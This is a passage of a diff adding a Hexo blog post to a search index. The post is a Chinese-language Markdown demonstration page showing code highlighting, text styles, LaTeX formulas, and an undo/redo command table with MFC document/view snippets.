+<h2 id="如果文字后面紧跟着水平线，看看是什么效果"><a href="#如果文字后面紧跟着水平线，看看是什么效果" class="headerlink" title="如果文字后面紧跟着水平线，看看是什么效果"></a>如果文字后面紧跟着水平线，看看是什么效果</h2><p>漂亮的代码，还可以自动高亮</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello markdown!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><em>我是斜体</em> </p>
+<p>测试文字里面，<strong>我是粗体</strong>，很简单</p>
+<p><strong>我是粗体</strong></p>
+<hr>
+<p>来源： <a href="http://www.wiz.cn/markdown.html">http://www.wiz.cn/markdown.html</a></p>
+<h1 id="复杂的"><a href="#复杂的" class="headerlink" title="复杂的"></a>复杂的</h1><p>包含<code>#include &lt;windows.h&gt;</code>头文件</p>
+<p><code>字符</code>（简短文字添加代码框）</p>
+<p>用2个<code>$</code>标记开始和结尾可以输入表达式，会居中显示：</p>
+<script type="math/tex; mode=display">1 \times 2 ^ 2 + 0 \times 2 ^ 1+1 * 2 ^ 1+1 * 2 ^ {-1} +1 * 2 ^ {4k} +1*2 ^ {-3} = 4+0+1+0.5+0.25+0.125=5.875</script><p>用1个<code>$</code>标记开始和结尾也可以，会左对齐显示，对比如下：</p>
+<p>$1 \times 2 ^ 2 + 0 \times 2 ^ 1+1 <em> 2 ^ 1+1 </em> 2 ^ {-1} +1 <em> 2 ^ {4k} +1</em>2 ^ {-3} = 4+0+1+0.5+0.25+0.125=5.875$</p>
+<p>注意在表达式中使用乘法时，不要用<code>*</code>，hexo中的markdown渲染器会把2个星号转义为斜体，导致公式显示错误，需要用<code>\times</code>显示，上面的表达示仅做演示用，可以看到<code>*</code>和<code>\times</code>的区别。</p>
+<p>分数表示：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">方法<span class="number">1</span>：\frac&#123;分子&#125;&#123;分母&#125;</span><br><span class="line">方法<span class="number">2</span>：分子 \over 分母</span><br></pre></td></tr></table></figure>
+<p>$\frac{a}{b}$ = ${c} \over {d}$</p>
+<p>复杂一点的：</p>
+<script type="math/tex; mode=display">x = \dfrac{-b \pm \sqrt{b^2 - 4ac}}{2a}</script><p>取整符号：<br>$\left\lceil\frac{a}{b}\right\rceil = \left\lfloor\frac{a+b-1}{b}\right\rfloor$</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>撤销</th>
+<th>重做</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>插入</td>
+<td>从m_shapeLst删除pShape</td>
+<td>向m_shapeLst中加入pShape</td>
+</tr>
+<tr>
+<td>删除</td>
+<td>向m_shapeLst中加入pShape</td>
+<td>从m_shapeLst删除pShpe</td>
+</tr>
+<tr>
+<td>移动</td>
+<td>ptNew  —&gt; ptOld</td>
+<td>ptOld   —&gt;   ptNew</td>
+</tr>
+<tr>
+<td>旋转</td>
+<td>ptNew  —&gt; ptOld</td>
+<td>ptOld   —&gt;   ptNew</td>
+</tr>
+<tr>
+<td>修改</td>
+<td>InfoNew —&gt; InfoOld</td>
+<td>InfoOld  —&gt;  InfoNew</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ol>
+<li>撤销动作<ul>
+<li>从撤销链表尾部取出一个ICommand* pCmd 命令对象</li>
+<li>将pCmd 命令对象加入到重做链表的尾部</li>
+<li>调用pCmd-&gt;UnExecCommand</li>
+</ul>
+</li>
+</ol>
+<p>有序表中间插内容：<br>1. 间接通过<code>doc</code></p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CMyCadDoc* pDoc = GetDocument();</span><br><span class="line">pDoc-&gt;UpdateAllViews(<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+<p>2. 直接调用<code>view</code>方法</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pDoc-&gt;GetFirstViewPosition</span><br><span class="line">pDoc-&gt;GetNextView</span><br><span class="line">pView-&gt;IsKindOf(RUNTIME_CLASS(CXXXView)</span><br></pre></td></tr></table></figure>
+<p>3. <code>MainFrm</code>中保存各<code>View</code></p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CSplitterWnd::GetPane</span><br><span class="line">CSplitterWnd::SetActiveView</span><br><span class="line">CSplitterWnd::GetActiveVIew</span><br></pre></td></tr></table></figure>
+<p>中划线</p>
+<p><del>要划除的行内内容</del></p>
+<p>上划线和下划线，用数学公式：</p>
+<p>上划线<br>$\overline{测试文本}$</p>
+<p>下划线<br>$\underline{测试文本}$</p>
+<p>Latex中点乘、叉乘、除以：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">点乘：a \cdot b</span><br><span class="line">叉乘：a \times b</span><br><span class="line">除以：a \div b</span><br></pre></td></tr></table></figure>
+<p>点乘：$a \cdot b$</p>
+<p>叉乘：$a \times b$</p>
+<p>除以：$a \div b$</p>
+<hr>
+<p>这个链接写的也不错<br><a href="http://www.jianshu.com/p/21d355525bdf">http://www.jianshu.com/p/21d355525bdf</a></p>
+<hr>
+<p>详细的<br><a href="http://www.wiz.cn/feature-markdown.html">http://www.wiz.cn/feature-markdown.html</a></p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
   </entry>
 </search>
